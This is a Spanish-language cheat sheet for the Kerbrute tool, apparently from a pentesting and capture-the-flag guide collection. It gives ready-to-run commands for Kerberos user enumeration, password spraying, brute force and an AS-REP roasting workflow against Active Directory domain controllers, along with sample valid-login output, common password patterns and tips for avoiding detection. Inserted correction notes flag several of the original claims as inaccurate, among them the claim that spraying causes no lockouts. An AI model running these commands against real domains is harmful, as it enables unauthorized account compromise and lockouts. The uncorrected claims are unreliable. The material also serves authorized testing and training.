# 🔑 Kerbrute - Enumeración de usuarios mediante Kerberos

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Herramienta de fuerza bruta de preautenticación Kerberos
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

---

## 📋 Índice

- [¿Qué es Kerbrute?](#-qué-es-kerbrute)
- [Instalación](#-instalación)
- [Enumeración de usuarios](#-enumeración-de-usuarios)
- [Pulverización de contraseñas](#-pulverización-de-contraseñas)
- [Fuerza bruta](#-fuerza-bruta)
- [Referencia rápida](#-referencia-rápida)

---

## 🎯 ¿Qué es Kerbrute?

**Kerbrute** aprovecha la preautenticación de Kerberos para enumerar usuarios y realizar password spraying (probar una misma contraseña con múltiples cuentas):

- 🔍 **Enumeración de usuarios** - ¡Encontrar nombres de usuario válidos sin credenciales!
- 🔐 **Password spraying** - Probar una contraseña con muchos usuarios
- 💥 **Fuerza bruta** - Probar credenciales de forma exhaustiva
- 🚫 **Sin riesgo de bloqueo** - Los fallos de preautenticación no provocan bloqueos

> **Corrección del original:** la afirmación de ausencia de bloqueos y la tabla siguiente solo pueden referirse a la enumeración sin contraseña. Las pruebas de contraseñas sí incrementan los fallos y pueden bloquear cuentas; también generan eventos Kerberos. Véase el [README oficial](https://github.com/ropnop/kerbrute#usage).

### ¿Por qué Kerbrute?

| Método | Provoca bloqueo | Genera registros |
|--------|------------------|----------------|
| Enlace LDAP | Sí | Sí |
| Autenticación SMB | Sí | Sí |
| **Preautenticación Kerberos** | **No** | Mínimos |

---

## 🚀 Instalación

### Descargar el binario

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

### Desde el código fuente

```bash
go install github.com/ropnop/kerbrute@latest
```

### Comprobar la instalación

```bash
kerbrute --help
```

---

## 🔍 Enumeración de usuarios

### Uso básico

```bash
# Enumerar usuarios a partir de una lista de palabras
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# Con el nombre de host del controlador de dominio
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

### Opciones de salida

```bash
# Salida detallada
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Guardar la salida en un archivo
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# Salida JSON
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

> **Compatibilidad:** el ejemplo `--json` se conserva del original; esa opción no figura en la ayuda oficial de la versión documentada. `-o` escribe registros, no necesariamente una lista limpia de usuarios ni JSON. Véase la [ayuda oficial](https://github.com/ropnop/kerbrute#usage).

### Uso de hilos

```bash
# Aumentar los hilos (predeterminado: 10)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# Uso de hilos con precauciones
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

> **Hilos y retardo:** `--delay` fuerza un solo hilo en la versión documentada, aunque se indique `-t`. El retardo no garantiza evitar bloqueos ni detección. Véase la [ayuda oficial](https://github.com/ropnop/kerbrute#usage).

### Ejemplo de salida

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

## 🔐 Pulverización de contraseñas

### Pulverización básica

```bash
# Una contraseña para varios usuarios
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# Desde un archivo
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

> **Aclaración:** «Desde un archivo» se refiere aquí a la lista de usuarios; la contraseña continúa siendo un argumento literal. El bucle siguiente divide las contraseñas por espacios en blanco, y esperar cinco minutos no garantiza que se reinicie el contador de fallos.

### Varias contraseñas

```bash
# Pulverizar varias contraseñas (¡una cada vez!)
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # Esperar 5 minutos entre rondas
done
```

### Salida

```bash
# Guardar las credenciales válidas
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

### Ejemplo de salida

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

### Pulverización con precauciones

```bash
# ¡Comprobar primero la directiva de contraseñas!
crackmapexec ldap DC01 -u user -p pass --password-policy

# Pocos intentos y con pausas
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

## 💥 Fuerza bruta

### Fuerza bruta completa

```bash
# Probar todas las combinaciones usuario:contraseña
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

> **Aclaración:** `bruteuser` prueba muchas contraseñas contra un usuario; `bruteforce` prueba pares usuario:contraseña. El comentario del primer ejemplo es impreciso.

### Lista de combinaciones

```bash
# Usar el formato usuario:contraseña
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# Formato de creds.txt:
# admin:Password1
# john:Summer2024
```

---

## 📊 Referencia rápida

### Comandos

| Comando | Descripción |
|---------|-------------|
| `userenum` | Enumerar nombres de usuario válidos |
| `passwordspray` | Probar una contraseña con varios usuarios |
| `bruteuser` | Fuerza bruta contra un solo usuario |
| `bruteforce` | Probar combinaciones usuario:contraseña |

### Opciones esenciales

| Opción | Descripción |
|--------|-------------|
| `-d` | Nombre del dominio |
| `--dc` | IP o nombre de host del controlador de dominio |
| `-t` | Hilos (predeterminado: 10) |
| `-o` | Archivo de salida |
| `-v` | Salida detallada |
| `--delay` | Retardo entre intentos (ms) |

### Enumeración de usuarios

```bash
# Básico
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# Con archivo de salida
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# Rápido
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

### Password spraying

```bash
# Pulverización básica
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# Pulverización con precauciones
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

### Listas de palabras para enumerar usuarios

```bash
# Nombres habituales
/usr/share/seclists/Usernames/Names/names.txt

# Nombres de usuario frecuentes
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Formato personalizado
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

### Contraseñas habituales

```
Season+Year: Summer2024!, Winter2024!, Fall2024!
Company+Num: CompanyName123!, Company2024!
Generic: Password1, Welcome1, P@ssw0rd
```

---

## 🎯 Consejos para CTF

1. **Enumerar primero** - ¡Obtener nombres de usuario sin credenciales!
2. **Comprobar AS-REP** - Tras encontrar usuarios, comprobar si tienen desactivada la preautenticación
3. **Pulverizar con cuidado** - Una contraseña y después esperar
4. **Revisar la directiva** - Conocer el umbral de bloqueo
5. **Usar retardos** - Evitar la detección

> **Preparación del archivo:** antes de reutilizar `users.txt` con GetNPUsers o password spraying, verifica que contenga solo nombres de usuario, uno por línea. El archivo de registros generado con `-o` puede incluir fechas y otros mensajes.

### Flujo de trabajo

```bash
# 1. Enumerar usuarios
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. Comprobar cuentas candidatas a AS-REP roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. Pulverizar contraseñas
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

## 📚 Recursos

- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [Blog de ropnop](https://blog.ropnop.com/)

### Guías rápidas relacionadas
- [Metodología de ataques a AD](../../AD-Attack-Methodology/translations/README.es.md)
- [Rubeus](../../Rubeus/translations/README.es.md)
- [CrackMapExec](../../CrackMapExec/translations/README.es.md)

---

<p align="center">
  <b>🔑 ¡Enumera usuarios y prueba contraseñas!</b><br>
  <i>Kerbrute - Una forma discreta de obtener acceso</i>
</p>
